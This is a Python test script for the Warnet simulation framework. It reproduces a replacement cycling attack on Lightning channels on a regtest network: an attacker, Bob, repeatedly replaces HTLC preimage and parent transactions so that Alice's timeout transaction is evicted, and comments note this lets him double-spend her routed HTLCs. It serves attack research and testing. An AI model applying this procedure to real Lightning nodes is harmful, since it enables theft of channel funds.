#!/usr/bin/env python3
# Copyright (c) 2023 The Bitcoin Core developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.
#
# Original: https://github.com/ariard/bitcoin/blob/30f5d5b270e4ff195e8dcb9ef6b7ddcc5f6a1bf2/test/functional/mempool_replacement_cycling.py#L5    # noqa


"""Test replacement cycling attacks against Lightning channels"""

import struct
import threading

import zmq
from test_framework.key import ECKey
from test_framework.messages import (
    COIN,
    COutPoint,
    CTransaction,
    CTxIn,
    CTxInWitness,
    CTxOut,
    sha256,
    tx_from_hex,
)
from test_framework.script import (
    OP_0,
    OP_2,
    OP_CHECKMULTISIG,
    OP_CHECKSIG,
    OP_DROP,
    OP_ELSE,
    OP_ENDIF,
    OP_EQUAL,
    OP_EQUALVERIFY,
    OP_HASH160,
    OP_NOTIF,
    OP_SIZE,
    OP_SWAP,
    OP_TRUE,
    SIGHASH_ALL,
    CScript,
    SegwitV0SignatureHash,
    hash160,
)
from test_framework.wallet import MiniWallet
from warnet.test_framework_bridge import WarnetTestFramework


def cli_help():
    return "Run a replacement cycling attack - based on ariard's work"


def get_funding_redeemscript(funder_pubkey, fundee_pubkey) -> CScript:
    return CScript(
        [OP_2, funder_pubkey.get_bytes(), fundee_pubkey.get_bytes(), OP_2, OP_CHECKMULTISIG]
    )


def get_anchor_single_key_redeemscript(pubkey):
    return CScript([pubkey.get_bytes(), OP_CHECKSIG])


def generate_funding_chan(wallet, coin, funder_pubkey, fundee_pubkey) -> CTransaction:
    witness_script = get_funding_redeemscript(funder_pubkey, fundee_pubkey)
    witness_program = sha256(witness_script)
    script_pubkey = CScript([OP_0, witness_program])

    funding_tx = CTransaction()
    funding_tx.vin.append(CTxIn(COutPoint(int(coin["txid"], 16), coin["vout"]), b""))
    funding_tx.vout.append(CTxOut(int(49.99998 * COIN), script_pubkey))
    funding_tx.rehash()

    wallet.sign_tx(funding_tx)
    return funding_tx


def generate_parent_child_tx(wallet, coin, sat_per_vbyte):
    # We build a junk parent transaction for the second-stage HTLC-preimage
    junk_parent_fee = 158 * sat_per_vbyte

    junk_script = CScript([OP_TRUE])
    junk_scriptpubkey = CScript([OP_0, sha256(junk_script)])

    junk_parent = CTransaction()
    junk_parent.vin.append(CTxIn(COutPoint(int(coin["txid"], 16), coin["vout"]), b""))
    junk_parent.vout.append(CTxOut(int(49.99998 * COIN - junk_parent_fee), junk_scriptpubkey))

    wallet.sign_tx(junk_parent)
    junk_parent.rehash()

    child_tx_fee = 158 * sat_per_vbyte

    child_tx = CTransaction()
    child_tx.vin.append(CTxIn(COutPoint(int(junk_parent.hash, 16), 0), b"", 0))
    child_tx.vout.append(
        CTxOut(int(49.99998 * COIN - (junk_parent_fee + child_tx_fee)), junk_scriptpubkey)
    )

    child_tx.wit.vtxinwit.append(CTxInWitness())
    child_tx.wit.vtxinwit[0].scriptWitness.stack = [junk_script]
    child_tx.rehash()

    return junk_parent, child_tx


def generate_preimage_tx(
    input_amount,
    sat_per_vbyte,
    funder_seckey,
    fundee_seckey,
    hashlock,
    commitment_tx,
    preimage_parent_tx,
):
    commitment_fee = 158 * 2  # Old sat per vbyte

    witness_script = CScript(
        [
            fundee_seckey.get_pubkey().get_bytes(),
            OP_SWAP,
            OP_SIZE,
            32,
            OP_EQUAL,
            OP_NOTIF,
            OP_DROP,
            2,
            OP_SWAP,
            funder_seckey.get_pubkey().get_bytes(),
            2,
            OP_CHECKMULTISIG,
            OP_ELSE,
            OP_HASH160,
            hashlock,
            OP_EQUALVERIFY,
            OP_CHECKSIG,
            OP_ENDIF,
        ]
    )

    spend_script = CScript([OP_TRUE])
    spend_scriptpubkey = CScript([OP_0, sha256(spend_script)])

    preimage_fee = 148 * sat_per_vbyte
    receiver_preimage = CTransaction()
    receiver_preimage.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 0), b"", 0))
    receiver_preimage.vin.append(CTxIn(COutPoint(int(preimage_parent_tx.hash, 16), 0), b"", 0))
    receiver_preimage.vout.append(
        CTxOut(int(2 * input_amount - (commitment_fee + preimage_fee * 3)), spend_scriptpubkey)
    )

    sig_hash = SegwitV0SignatureHash(
        witness_script, receiver_preimage, 0, SIGHASH_ALL, commitment_tx.vout[0].nValue
    )
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b"\x01"

    # Spend the commitment transaction HTLC output
    receiver_preimage.wit.vtxinwit.append(CTxInWitness())
    receiver_preimage.wit.vtxinwit[0].scriptWitness.stack = [fundee_sig, b"a" * 32, witness_script]

    # Spend the parent transaction OP_TRUE output
    junk_script = CScript([OP_TRUE])
    receiver_preimage.wit.vtxinwit.append(CTxInWitness())
    receiver_preimage.wit.vtxinwit[1].scriptWitness.stack = [junk_script]
    receiver_preimage.rehash()

    return receiver_preimage


def create_chan_state(
    funding_txid,
    funding_vout,
    funder_seckey,
    fundee_seckey,
    input_amount,
    input_script: CScript,
    sat_per_vbyte,
    timelock: int,
    hashlock,
    nsequence,
    preimage_parent_tx: CTransaction,
) -> tuple[CTransaction, CTransaction, CTransaction]:
    witness_script = CScript(
        [
            fundee_seckey.get_pubkey().get_bytes(),
            OP_SWAP,
            OP_SIZE,
            32,
            OP_EQUAL,
            OP_NOTIF,
            OP_DROP,
            2,
            OP_SWAP,
            funder_seckey.get_pubkey().get_bytes(),
            2,
            OP_CHECKMULTISIG,
            OP_ELSE,
            OP_HASH160,
            hashlock,
            OP_EQUALVERIFY,
            OP_CHECKSIG,
            OP_ENDIF,
        ]
    )
    witness_program = sha256(witness_script)
    script_pubkey = CScript([OP_0, witness_program])

    # Expected size = 158 vbyte
    commitment_fee = 158 * sat_per_vbyte
    commitment_tx = CTransaction()
    commitment_tx.vin.append(CTxIn(COutPoint(int(funding_txid, 16), funding_vout), b"", 0x1))
    commitment_tx.vout.append(CTxOut(int(input_amount - 158 * sat_per_vbyte), script_pubkey))

    sig_hash = SegwitV0SignatureHash(input_script, commitment_tx, 0, SIGHASH_ALL, int(input_amount))
    funder_sig = funder_seckey.sign_ecdsa(sig_hash) + b"\x01"
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b"\x01"

    commitment_tx.wit.vtxinwit.append(CTxInWitness())
    commitment_tx.wit.vtxinwit[0].scriptWitness.stack = [b"", funder_sig, fundee_sig, input_script]
    commitment_tx.rehash()

    spend_script = CScript([OP_TRUE])
    spend_scriptpubkey = CScript([OP_0, sha256(spend_script)])

    timeout_fee = 158 * sat_per_vbyte
    offerer_timeout = CTransaction()
    offerer_timeout.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 0), b"", nsequence))
    offerer_timeout.vout.append(
        CTxOut(int(input_amount - (commitment_fee + timeout_fee)), spend_scriptpubkey)
    )
    offerer_timeout.nLockTime = timelock

    sig_hash = SegwitV0SignatureHash(
        witness_script, offerer_timeout, 0, SIGHASH_ALL, commitment_tx.vout[0].nValue
    )
    funder_sig = funder_seckey.sign_ecdsa(sig_hash) + b"\x01"
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b"\x01"

    offerer_timeout.wit.vtxinwit.append(CTxInWitness())
    offerer_timeout.wit.vtxinwit[0].scriptWitness.stack = [
        b"",
        fundee_sig,
        funder_sig,
        b"",
        witness_script,
    ]
    offerer_timeout.rehash()

    preimage_fee = 148 * sat_per_vbyte
    receiver_preimage = CTransaction()
    receiver_preimage.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 0), b"", 0))
    receiver_preimage.vin.append(CTxIn(COutPoint(int(preimage_parent_tx.hash, 16), 0), b"", 0))
    receiver_preimage.vout.append(
        CTxOut(int(2 * input_amount - (commitment_fee + preimage_fee * 3)), spend_scriptpubkey)
    )

    sig_hash = SegwitV0SignatureHash(
        witness_script, receiver_preimage, 0, SIGHASH_ALL, commitment_tx.vout[0].nValue
    )
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b"\x01"

    # Spend the commitment transaction HTLC output
    receiver_preimage.wit.vtxinwit.append(CTxInWitness())
    receiver_preimage.wit.vtxinwit[0].scriptWitness.stack = [fundee_sig, b"a" * 32, witness_script]

    # Spend the parent transaction OP_TRUE output
    junk_script = CScript([OP_TRUE])
    receiver_preimage.wit.vtxinwit.append(CTxInWitness())
    receiver_preimage.wit.vtxinwit[1].scriptWitness.stack = [junk_script]
    receiver_preimage.rehash()

    return commitment_tx, offerer_timeout, receiver_preimage


class ReplacementCyclingTest(WarnetTestFramework):
    def set_test_params(self):
        self.num_nodes = 2

    def add_options(self, parser):
        parser.add_argument(
            "--setup-nodes",
            dest="setup_nodes",
            action="store_true",
            help="Setup Nodes",
        )
        parser.add_argument(
            "--alice-broadcast-funding-txn",
            dest="alice_broadcast_funding_txn",
            action="store_true",
            help="Alice broadcast funding txn",
        )
        parser.add_argument(
            "--mine-blocks",
            dest="mine_blocks",
            action="store_true",
            help="Mine blocks",
        )
        parser.add_argument(
            "--create-channel-state",
            dest="create_channel_state",
            default="",
            type=str,
            help="Create channel state with ab_funding_txid",
        )
        parser.add_argument(
            "--alice-rebroadcasts",
            dest="alice_rebroadcasts",
            default="",
            type=str,
            nargs=4,
            help="Re-broadcast Alice transaction",
        )
        parser.add_argument(
            "--bob-broadcast-higher-parent-child",
            dest="bob_broadcast_higher_parent_child",
            default="",
            type=str,
            nargs=2,
            help="Re-broadcast Bob Parent-Child with more fees",
        )
        parser.add_argument(
            "--bob-rebroadcasts",
            dest="bob_rebroadcasts",
            default="",
            type=str,
            help="bob_rebroadcasts with coin 3",
        )
        parser.add_argument(
            "--broadcast-txn",
            dest="broadcast_txn",
            default="",
            type=str,
            help="Broadcast transaction",
        )
        parser.add_argument(
            "--get-raw-mempool",
            dest="get_raw_mempool",
            action="store_true",
            help="get_raw_mempool",
        )

    def zmq_listener(self, threading_event: threading.Event):
        self.log.info("Starting zmq listener")
        context = zmq.Context()

        socket = context.socket(zmq.SUB)

        zmq_port = "28334"
        socket.connect(f"tcp://warnet-tank-000000-service:{zmq_port}")

        socket.setsockopt_string(zmq.SUBSCRIBE, "")

        try:
            while not threading_event.is_set():
                topic, body, sequence = socket.recv_multipart()
                received_seq = struct.unpack("<I", sequence)[-1]
                txid = body[:32].hex()
                label = chr(body[32])
                if label == "R" or label == "A":
                    self.log.info(f"zmq: {received_seq} - {label} - {txid}")

        except KeyboardInterrupt:
            self.log.info("Zmq listener got KeyboardInterrupt")

        finally:
            self.log.info("Shutting down zmq listener")
            socket.close()
            context.term()

    def setup_nodes(self):
        address = "bcrt1p9yfmy5h72durp7zrhlw9lf7jpwjgvwdg0jr0lqmmjtgg83266lqsekaqka"  # noqa

        self.generatetoaddress(self.nodes[0], nblocks=101, address=address)

        alice = self.nodes[0]
        alice_seckey = ECKey()
        alice_seckey.set((1).to_bytes(32, "big"), True)
        _bob = self.nodes[1]
        bob_seckey = ECKey()
        bob_seckey.set((2).to_bytes(32, "big"), True)

        self.generate(alice, 501)

        self.sync_all()
        last_blockhash = alice.getbestblockhash()
        block = alice.getblock(last_blockhash)
        last_blockheight = block["height"]

        self.connect_nodes(0, 1)
        self.log.info(f"@{last_blockheight} - Setup Alice and Bob nodes")

    def alice_broadcast_funding_txn(self):
        alice = self.nodes[0]
        alice_seckey = ECKey()
        alice_seckey.set((1).to_bytes(32, "big"), True)
        bob = self.nodes[1]
        bob_seckey = ECKey()
        bob_seckey.set((2).to_bytes(32, "big"), True)

        self.sync_all()
        last_blockhash = alice.getbestblockhash()
        block = alice.getblock(last_blockhash)
        last_blockheight = block["height"]

        self.wallet = MiniWallet(alice)

        coin_1 = self.wallet.get_utxo()

        # Generate funding transaction opening channel between Alice and Bob.
        ab_funding_tx = generate_funding_chan(
            self.wallet, coin_1, alice_seckey.get_pubkey(), bob_seckey.get_pubkey()
        )

        self.log.info(
            f"@{last_blockheight} {ab_funding_tx.hash[0:7]} Funding Txn "
            f"- Funded by: [{coin_1['txid'][0:7]} Coin 1]"
        )
        self.log.info(
            f"@{last_blockheight} {ab_funding_tx.hash[0:7]} Funding Txn "
            "- Signed by: Alice & Bob "
            "- Alice/Bob 2/2 multisig"
        )

        # Propagate and confirm funding transaction.
        ab_funding_txid = alice.sendrawtransaction(
            hexstring=ab_funding_tx.serialize().hex(), maxfeerate=0
        )
        self.log.info(
            f"@{last_blockheight} {ab_funding_tx.hash[0:7]} Funding Txn " "- Broadcasted by: Alice"
        )

        self.sync_all()

        assert ab_funding_txid in alice.getrawmempool()
        assert ab_funding_txid in bob.getrawmempool()
        self.log.info(
            f"@{last_blockheight} {ab_funding_txid[0:7]} Funding Txn " "- Seen in the mempool"
        )
        self.log.info(f"Funding txid: {ab_funding_txid}")  # need to mine a block now

    def mine_blocks(self):
        alice = self.nodes[0]

        self.sync_all()
        last_blockhash = alice.getbestblockhash()
        block = alice.getblock(last_blockhash)
        last_blockheight = block["height"]
        self.log.info(f"@{last_blockheight} Raw_mempool: {alice.getrawmempool()}")

        self.generate(alice, 20)

        self.sync_all()
        last_blockhash = alice.getbestblockhash()
        block = alice.getblock(last_blockhash)
        last_blockheight = block["height"]

        self.log.info(f"@{last_blockheight} Raw_mempool: {alice.getrawmempool()}")

    def create_channel_state(self, ab_funding_txid, nsequence="0x1"):
        alice = self.nodes[0]
        alice_seckey = ECKey()
        alice_seckey.set((1).to_bytes(32, "big"), True)
        bob = self.nodes[1]
        bob_seckey = ECKey()
        bob_seckey.set((2).to_bytes(32, "big"), True)

        self.wallet = MiniWallet(alice)

        self.sync_all()
        last_blockhash = alice.getbestblockhash()
        block = alice.getblock(last_blockhash)
        last_blockheight = block["height"]

        coin_2 = self.wallet.get_utxo()

        (bob_parent_tx, bob_child_tx) = generate_parent_child_tx(self.wallet, coin_2, 1)
        self.log.info(f"Bob parent txn: {bob_parent_tx.serialize().hex()}")
        self.log.info(f"Bob child txn: {bob_child_tx.serialize().hex()}")
        self.log.info(f"Coin_2: {coin_2}")

        self.log.info(
            f"@{last_blockheight} {bob_parent_tx.hash[0:7]} Parent Txn "
            f"- Funded by: [{coin_2['txid'][0:7]} Coin_2]"
        )
        self.log.info(f"@{last_blockheight} {bob_parent_tx.hash[0:7]} Parent Txn - Created by: Bob")
        self.log.info(f"@{last_blockheight} {bob_parent_tx.hash[0:7]} Parent Txn - Signed by: Bob")
        self.log.info(f"@{last_blockheight} {bob_child_tx.hash[0:7]} Child Txn - Created by: Bob")

        funding_redeemscript = get_funding_redeemscript(
            alice_seckey.get_pubkey(), bob_seckey.get_pubkey()
        )

        hashlock = hash160(b"a" * 32)

        alice_timeout_height = last_blockheight + 20
        self.log.info(f"Alice timeout height: {alice_timeout_height}")

        (ab_commitment_tx, alice_timeout_tx, bob_preimage_tx) = create_chan_state(
            ab_funding_txid,
            0,
            alice_seckey,
            bob_seckey,
            49.99998 * COIN,
            funding_redeemscript,
            2,
            alice_timeout_height,
            hashlock,
            int(nsequence, 16),
            bob_parent_tx,
        )
        self.log.info(f"Commitment tx: {ab_commitment_tx.serialize().hex()}")
        self.log.info(f"Alice timeout tx: {alice_timeout_tx.serialize().hex()}")
        self.log.info(f"Bob preimage tx: {bob_preimage_tx.serialize().hex()}")

        self.log.info(
            f"@{last_blockheight} {ab_commitment_tx.hash[0:7]} Commitment Txn "
            f"- Funded by: [{ab_funding_txid[0:7]} Funding Txn]"
        )
        self.log.info(
            f"@{last_blockheight} {ab_commitment_tx.hash[0:7]} Commitment Txn "
            f"- Signed by: Alice & Bob "
            "- Alice + Bob can claim with 2:2 multisig; Bob can claim with hashlock"
        )
        self.log.info(
            f"@{last_blockheight} {alice_timeout_tx.hash[0:7]} Alice Timeout Txn  "
            f"- Funded by: [{ab_commitment_tx.hash[0:7]} Commitment Txn]"
        )
        self.log.info(
            f"@{last_blockheight} {alice_timeout_tx.hash[0:7]} Alice Timeout Txn "
            f"- Signed by: Alice & Bob "
            f"- After nLockTime ({alice_timeout_height}), Alice can claim"
        )
        self.log.info(
            f"@{last_blockheight} {bob_preimage_tx.hash[0:7]} Bob Preimage Txn "
            f"- Funded by: [{ab_commitment_tx.hash[0:7]} Commitment Txn, "
            f"{bob_parent_tx.hash[0:7]} Parent Txn]"
        )
        self.log.info(
            f"@{last_blockheight} {bob_preimage_tx.hash[0:7]} Bob Preimage Txn "
            f"- Signed by: Bob "
            f"- Bob can claim with his preimage"
        )

        # We broadcast Alice - Bob commitment transaction.
        ab_commitment_txid = alice.sendrawtransaction(
            hexstring=ab_commitment_tx.serialize().hex(), maxfeerate=0
        )
        alice.log.info(
            f"@{last_blockheight} {ab_commitment_tx.hash[0:7]} Commitment Txn "
            "- Broadcasted by: Alice"
        )

        self.sync_all()

        assert ab_commitment_txid in alice.getrawmempool()
        assert ab_commitment_txid in bob.getrawmempool()
        self.log.info(
            f"@{last_blockheight} {ab_commitment_tx.hash[0:7]} Commitment Txn - "
            "Seen in the mempool"
        )  # Need to mine a block now

    def broadcast_txn(self, tx: str):
        alice = self.nodes[0]
        bob = self.nodes[1]

        last_blockhash = alice.getbestblockhash()
        block = alice.getblock(last_blockhash)
        last_blockheight = block["height"]

        # Broadcast the Bob parent transaction and its child transaction
        txid = bob.sendrawtransaction(hexstring=tx, maxfeerate=0)

        self.log.info(f"@{last_blockheight} {txid}")

        self.sync_all()

        assert txid in alice.getrawmempool()
        assert txid in bob.getrawmempool()
        self.log.info(f"In mempool: {txid}")

    def bob_broadcast_parent_and_child(self, bob_parent_tx, bob_child_tx):
        alice = self.nodes[0]
        bob = self.nodes[1]

        last_blockhash = alice.getbestblockhash()
        block = alice.getblock(last_blockhash)
        last_blockheight = block["height"]

        # Broadcast the Bob parent transaction and its child transaction
        bob_parent_txid = bob.sendrawtransaction(hexstring=bob_parent_tx, maxfeerate=0)
        bob_child_txid = bob.sendrawtransaction(hexstring=bob_child_tx, maxfeerate=0)

        self.log.info(
            f"@{last_blockheight} {bob_parent_txid[0:7]} Parent Txn " "- Broadcasted by: Bob"
        )
        self.log.info(
            f"@{last_blockheight} {bob_child_txid[0:7]} Child Txn " "- Broadcasted by: Bob"
        )

        self.sync_all()

        assert bob_parent_txid in alice.getrawmempool()
        assert bob_parent_txid in bob.getrawmempool()
        assert bob_child_txid in alice.getrawmempool()
        assert bob_child_txid in bob.getrawmempool()
        self.log.info(
            f"@{last_blockheight} {bob_parent_txid[0:7]} Parent Txn " f"- Seen in the mempool"
        )
        self.log.info(f"@{last_blockheight} {bob_child_txid[0:7]} Child Txn - Seen in the mempool")

    def alice_broadcast_timeout_tx(self, timeout_tx):
        alice = self.nodes[0]
        bob = self.nodes[1]

        last_blockhash = alice.getbestblockhash()
        block = alice.getblock(last_blockhash)
        last_blockheight = block["height"]

        # Broadcast the Alice timeout transaction
        alice_timeout_txid = alice.sendrawtransaction(hexstring=timeout_tx, maxfeerate=0)
        self.log.info(
            f"@{last_blockheight} {alice_timeout_txid[0:7]} Timeout Txn " f"- Broadcasted by: Alice"
        )

        self.sync_all()

        assert alice_timeout_txid in alice.getrawmempool()
        assert alice_timeout_txid in bob.getrawmempool()
        self.log.info(
            f"@{last_blockheight} {alice_timeout_txid[0:7]} Alice Timeout Txn "
            f"- Seen in the mempool"
        )

    def bob_broadcast_preimage_tx(self, bob_preimage_tx):
        alice = self.nodes[0]
        alice_seckey = ECKey()
        alice_seckey.set((1).to_bytes(32, "big"), True)
        bob = self.nodes[1]
        bob_seckey = ECKey()
        bob_seckey.set((2).to_bytes(32, "big"), True)

        last_blockhash = alice.getbestblockhash()
        block = alice.getblock(last_blockhash)
        last_blockheight = block["height"]

        # Broadcast the Bob preimage transaction
        bob_preimage_txid = bob.sendrawtransaction(hexstring=bob_preimage_tx, maxfeerate=0)
        self.log.info(
            f"@{last_blockheight} {bob_preimage_txid[0:7]} Preimage Txn - Broadcasted by: Bob "
            f"- should kick out Alice's Timeout Txn"
        )

        self.sync_all()

        assert bob_preimage_txid in alice.getrawmempool()
        assert bob_preimage_txid in bob.getrawmempool()
        self.log.info(
            f"@{last_blockheight} {bob_preimage_txid[0:7]} Preimage Txn - Seen in the mempool "
            "- this should kick out Alice's Timeout Txn"
        )  # Check Alice timeout transaction and Bob child tx are not in the mempools anymore

    def bob_broadcast_higher_parent_child(self, coin_txid, coin_vout):
        alice = self.nodes[0]
        bob = self.nodes[1]

        self.wallet = MiniWallet(alice)

        last_blockhash = alice.getbestblockhash()
        block = alice.getblock(last_blockhash)
        last_blockheight = block["height"]

        # Generate a higher fee parent transaction and broadcast it to replace Bob preimage tx
        (bob_replacement_parent_tx, bob_child_tx) = generate_parent_child_tx(
            self.wallet, {"txid": coin_txid, "vout": int(coin_vout)}, 10
        )

        self.log.info(
            f"@{last_blockheight} {bob_replacement_parent_tx.hash[0:7]} "
            f"Replacement Parent Txn - Funded by: [{coin_txid[0:7]} Coin_2]"
        )
        self.log.info(
            f"@{last_blockheight} {bob_replacement_parent_tx.hash[0:7]} "
            f"Replacement Parent Txn - Created by: Bob - Has a higher fee"
        )
        self.log.info(
            f"@{last_blockheight} {bob_replacement_parent_tx.hash[0:7]} "
            f"Replacement Parent Txn - Signed by: Bob"
        )
        self.log.info(f"@{last_blockheight} {bob_child_tx.hash[0:7]} Child Txn - Created by: Bob")

        bob_replacement_parent_txid = bob.sendrawtransaction(
            hexstring=bob_replacement_parent_tx.serialize().hex(), maxfeerate=0
        )

        self.log.info(
            f"@{last_blockheight} {bob_replacement_parent_txid[0:7]} Replacement Parent Txn "
            f"- Broadcasted by: Bob"
        )

        self.sync_all()

        # Check Bob HTLC preimage is not in the mempools anymore
        # assert bob_preimage_txid not in alice.getrawmempool()
        # assert bob_preimage_txid not in bob.getrawmempool()
        assert bob_replacement_parent_txid in alice.getrawmempool()
        assert bob_replacement_parent_txid in alice.getrawmempool()
        self.log.info(f"@{last_blockheight} Raw_mempool: {alice.getrawmempool()}")
        self.log.info(
            f"@{last_blockheight} {bob_replacement_parent_txid[0:7]} "
            f"Replacement Parent Txn - Seen in the mempool"
        )  # Need to mine a block such that the bob replacement parent should have confirmations.

    def alice_rebroadcasts(self, ab_funding_txid, alice_timeout_height, bob_parent_tx, nsequence):
        alice = self.nodes[0]
        alice_seckey = ECKey()
        alice_seckey.set((1).to_bytes(32, "big"), True)
        bob = self.nodes[1]
        bob_seckey = ECKey()
        bob_seckey.set((2).to_bytes(32, "big"), True)

        self.wallet = MiniWallet(alice)

        last_blockhash = alice.getbestblockhash()
        block = alice.getblock(last_blockhash)
        last_blockheight = block["height"]

        funding_redeemscript = get_funding_redeemscript(
            alice_seckey.get_pubkey(), bob_seckey.get_pubkey()
        )

        hashlock = hash160(b"a" * 32)

        alice_timeout_height = int(alice_timeout_height)
        bob_parent_tx: CTransaction = tx_from_hex(bob_parent_tx)
        bob_parent_tx.rehash()
        nsequence = int(nsequence, 16)

        # Alice can re-broadcast her HTLC-timeout as the offered output has not been claimed
        # Note the HTLC-timeout _txid_ must be modified to bypass p2p filters. Here we +1 the
        # nSequence.
        (_, alice_timeout_tx_2, _) = create_chan_state(
            ab_funding_txid,
            0,
            alice_seckey,
            bob_seckey,
            49.99998 * COIN,
            funding_redeemscript,
            2,
            alice_timeout_height,
            hashlock,
            nsequence,  # 0x2,
            bob_parent_tx,
        )

        self.log.info(
            f"@{last_blockheight} {alice_timeout_tx_2.hash[0:7]} Timeout Txn 2 "
            f"- Created by: Alice - Alice tweaks the nsequence (and therefore txid) "
        )

        alice_timeout_txid_2 = alice.sendrawtransaction(
            hexstring=alice_timeout_tx_2.serialize().hex(), maxfeerate=0
        )

        self.log.info(
            f"@{last_blockheight} {alice_timeout_txid_2[0:7]} Timeout Txn 2 "
            f"- Broadcasted by: Alice"
        )

        self.sync_all()

        assert alice_timeout_txid_2 in alice.getrawmempool()
        assert alice_timeout_txid_2 in bob.getrawmempool()

    def bob_rebroadcasts(self, ab_commitment_tx):
        alice = self.nodes[0]
        alice_seckey = ECKey()
        alice_seckey.set((1).to_bytes(32, "big"), True)
        bob = self.nodes[1]
        bob_seckey = ECKey()
        bob_seckey.set((2).to_bytes(32, "big"), True)

        self.wallet = MiniWallet(alice)

        last_blockhash = alice.getbestblockhash()
        block = alice.getblock(last_blockhash)
        last_blockheight = block["height"]

        hashlock = hash160(b"a" * 32)

        ab_commitment_tx: CTransaction = tx_from_hex(ab_commitment_tx)
        ab_commitment_tx.rehash()

        # Note all the transactions are re-generated to bypass p2p filters
        coin_3 = self.wallet.get_utxo()
        (bob_parent_tx_2, bob_child_tx_2) = generate_parent_child_tx(self.wallet, coin_3, 4)
        bob_preimage_tx_2 = generate_preimage_tx(
            49.9998 * COIN, 4, alice_seckey, bob_seckey, hashlock, ab_commitment_tx, bob_parent_tx_2
        )

        self.log.info(
            f"@{last_blockheight} {bob_parent_tx_2.hash[0:7]} "
            f"Parent Txn 2 - Funded by: [{coin_3['txid'][0:7]} Coin_3]"
        )
        self.log.info(
            f"@{last_blockheight} {bob_parent_tx_2.hash[0:7]} Parent Txn 2 " f"- Created by: Bob"
        )
        self.log.info(
            f"@{last_blockheight} {bob_child_tx_2.hash[0:7]} Child Txn 2 " f"- Created by: Bob"
        )
        self.log.info(
            f"@{last_blockheight} {bob_preimage_tx_2.hash[0:7]} Preimage Txn 2 "
            f"- Created by: Bob"
        )
        self.log.info(f"@{last_blockheight} {bob_preimage_tx_2.hash[0:7]} Preimage Txn 2 ")

        bob_parent_txid_2 = bob.sendrawtransaction(
            hexstring=bob_parent_tx_2.serialize().hex(), maxfeerate=0
        )

        self.log.info(
            f"@{last_blockheight} {bob_parent_txid_2[0:7]} Parent Txn 2 - Broadcasted by: Bob"
        )

        self.sync_all()

        bob_child_txid_2 = bob.sendrawtransaction(
            hexstring=bob_child_tx_2.serialize().hex(), maxfeerate=0
        )

        self.log.info(
            f"@{last_blockheight} {bob_child_txid_2[0:7]} Child Txn 2 - Broadcasted by: Bob"
        )

        self.sync_all()

        bob_preimage_txid_2 = bob.sendrawtransaction(
            hexstring=bob_preimage_tx_2.serialize().hex(), maxfeerate=0
        )

        self.log.info(
            f"@{last_blockheight} {bob_preimage_txid_2[0:7]} Preimage Txn 2 "
            f"- Broadcasted by Bob"
        )

        self.sync_all()

        assert bob_preimage_txid_2 in alice.getrawmempool()
        assert bob_preimage_txid_2 in bob.getrawmempool()

        self.log.info(
            f"@{last_blockheight} {bob_preimage_txid_2[0:7]} Preimage Txn 2 "
            f"- Seen in the mempool"
        )  # Bob can repeat this replacement cycling trick until an inbound HTLC of Alice expires and double-spend her routed HTLCs. ... but it gets mined immediately? - Greg

    def get_raw_mempool(self):
        alice = self.nodes[0]

        last_blockhash = alice.getbestblockhash()
        block = alice.getblock(last_blockhash)
        last_blockheight = block["height"]

        self.log.info(f"@{last_blockheight} Raw_mempool: {alice.getrawmempool()}")

    def run_test(self):
        terminate_event = threading.Event()
        subscriber_thread = threading.Thread(target=self.zmq_listener, args=(terminate_event,))
        subscriber_thread.start()

        if self.options.setup_nodes:
            self.setup_nodes()
        elif self.options.alice_broadcast_funding_txn:
            self.alice_broadcast_funding_txn()
        elif self.options.mine_blocks:
            self.mine_blocks()
        elif len(self.options.create_channel_state) > 1:
            self.create_channel_state(self.options.create_channel_state)
        elif len(self.options.broadcast_txn) > 1:
            self.broadcast_txn(self.options.broadcast_txn)
        elif self.options.get_raw_mempool:
            self.get_raw_mempool()
        elif len(self.options.alice_rebroadcasts) > 1:
            ab_funding_txid, alice_timeout_height, bob_parent_tx, nsequence = (
                self.options.alice_rebroadcasts
            )
            self.alice_rebroadcasts(ab_funding_txid, alice_timeout_height, bob_parent_tx, nsequence)
        elif len(self.options.bob_broadcast_higher_parent_child) > 1:
            coin_txid, coin_vout = self.options.bob_broadcast_higher_parent_child
            self.bob_broadcast_higher_parent_child(coin_txid, coin_vout)
        elif len(self.options.bob_rebroadcasts) > 1:
            ab_commitment_txn = self.options.bob_rebroadcasts
            self.bob_rebroadcasts(ab_commitment_txn)
        else:
            self.log.info("Could not parse command")

        self.log.info("Sending zmq thread shutdown notice")
        terminate_event.set()
        subscriber_thread.join()


if __name__ == "__main__":
    ReplacementCyclingTest().main()
